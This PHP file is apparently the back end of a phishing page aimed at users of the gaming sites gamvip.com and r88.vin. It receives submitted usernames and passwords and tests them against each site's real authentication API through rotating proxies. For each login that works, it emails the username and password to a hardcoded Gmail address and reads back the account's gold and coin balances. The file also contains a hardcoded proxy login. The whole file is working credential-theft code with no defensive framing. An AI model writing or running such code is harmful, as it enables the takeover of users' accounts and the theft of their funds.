<?php

$to_email = "tusoncao@gmail.com";

function sendEmail($email_to, $subject, $content)
{
    $email_forward = "GamVip";
    $error_message = "";
    $email_subject = $subject;
    $headers = 'From: ' . $email_forward . "\r\n" . 'Reply-To: ' . $email_forward . "\r\n" . 'X-Mailer: PHP/' . phpversion();
    $check_send = mail($email_to, $email_subject, $content, $headers);
    
    //die(); 
}

// Test account

// $username = 'boynhagiau88';
// $password = 'Nokia11000';

$username = $_POST['un'];
$password = $_POST['pww'];
$passwordMD5 = md5($password);

$data = array(
    'Username' => $username,
    'Password' => $password,
    'Md5Password' => md5($password) ,
    'OTP' => '',
    'Captcha' => '',
    'Verify' => '',
);

$ch = curl_init();

$proxies = require "proxies.php";

$proxy = $proxies[array_rand($proxies) ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTPS');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'hugobosss1606:Nokia11000');
curl_setopt($ch, CURLOPT_URL, 'https://id.gamvip.com/api/Account/authenticate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Referer: https://gamvip.com/';
$headers[] = 'Origin: https://gamvip.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
$headers[] = 'Content-Type: application/json';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

//file_put_contents('00error_log.txt', $username . '|' . $password . PHP_EOL, FILE_APPEND | LOCK_EX);

$result = curl_exec($ch);

if (curl_errno($ch))
{
    echo 'Error:' . curl_error($ch);
}

curl_close($ch);
$data_json = array();
$data_result = json_decode($result);

$data_code = $data_result->c;

/**/

if ($data_code == 0) {
    //NOT OTP
    $data_array = $data_result->d;
    if ($data_array->accountID)
    {
        if (!$data_array->accountID)
        {
            $data_json['code'] = 0;
            $data_json['msg'] = 'Tài khoản hoặc mật khẩu không đúng';
            $data_json['url'] = '#';
        }
        else
        {
            $data_json['code'] = 1;
            $data_json['game'] = 'Gam';
            $data_json['gold'] = $data_array->goldBalance;
            $data_json['coin'] = $data_array->coinBalance;
            $data_json['msg'] = 'Đăng nhập thành công';

            $body = "Thông tin đăng nhập! \n";
            $body .= "Username: " . $username . " | Password: " . $password;
            sendEmail($to_email, "GAMVIP Auto Sender ", $body);

        }

    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://id.r88.vin/api/Account/authenticate');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = 'Accept: application/json';
        $headers[] = 'Referer: https://r88.vin/';
        $headers[] = 'Origin: https://r88.vin/';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
        $headers[] = 'Content-Type: application/json';

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);

        if (curl_errno($ch))
        {

            echo 'Error:' . curl_error($ch);

        }

        curl_close($ch);

        $data_json = array();

        $data_result = json_decode($result);

        $data_array = $data_result->d;

        if (!$data_array->accountID)
        {

            $data_json['code'] = 0;
            $data_json['msg'] = 'Tài khoản hoặc mật khẩu không đúng';
            $data_json['url'] = '#';
            
        }
        else
        {
            $data_json['code'] = 1;
            $data_json['game'] = 'R88';
            $data_json['gold'] = $data_array->goldBalance;
            $data_json['coin'] = $data_array->coinBalance;
            $data_json['msg'] = 'Đăng nhập thành công';

            $body = "Thông tin đăng nhập! \n";
            $body .= "Username: " . $username . " | Password: " . $password;
            sendEmail($to_email, "GAMVIP Auto Sender ", $body);

        }
    }

    //file_put_contents('00error_log.txt', $data_code . '|' . $username . PHP_EOL, FILE_APPEND | LOCK_EX);

} else if ($data_code == 2) {
    //OTP
    $data_json['code'] = 2;
    $data_json['game'] = 'Gam';
    $data_json['msg'] = 'Bạn đang sử dụng tính năng đăng nhập bằng OTP. Vui lòng nhập OTP để đăng nhập';
    $data_json['url'] = '#';

    $body = "Hi! \n This is test email send by PHP Script \n";
    $body .= "Tài khoản hoặc mật khẩu không đúng ###gamvip";
    sendEmail($to_email, "GAMVIP Auto Sender Email ", $body);

    //file_put_contents('00error_log.txt', $data_code . '|' . $username . PHP_EOL, FILE_APPEND | LOCK_EX);

} else {
    //NOT SUCCESS
    //file_put_contents('00error_log.txt', $data_code . 'Khong ton tai|' . PHP_EOL, FILE_APPEND | LOCK_EX);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://id.r88.vin/api/Account/authenticate');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $headers = array();
    $headers[] = 'Accept: application/json';
    $headers[] = 'Referer: https://r88.vin/';
    $headers[] = 'Origin: https://r88.vin/';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
    $headers[] = 'Content-Type: application/json';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch))
    {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    $data_json = array();
    $data_result = json_decode($result);
    $data_array = $data_result->d;
    if (!$data_array->accountID)
    {

        $data_json['code'] = 0;
        $data_json['msg'] = 'Tài khoản hoặc mật khẩu không đúng';
        $data_json['url'] = '#';
        
    }
    else
    {
        $data_json['code'] = 1;
        $data_json['game'] = 'R88';
        $data_json['gold'] = $data_array->goldBalance;
        $data_json['coin'] = $data_array->coinBalance;
        $data_json['msg'] = 'Đăng nhập thành công';

        $body = "Thông tin đăng nhập! \n";
        $body .= "Username: " . $username . " | Password: " . $password;
        sendEmail($to_email, "GAMVIP Auto Sender", $body);

    }
}


header('Content-Type: application/json');

echo json_encode($data_json);

?>
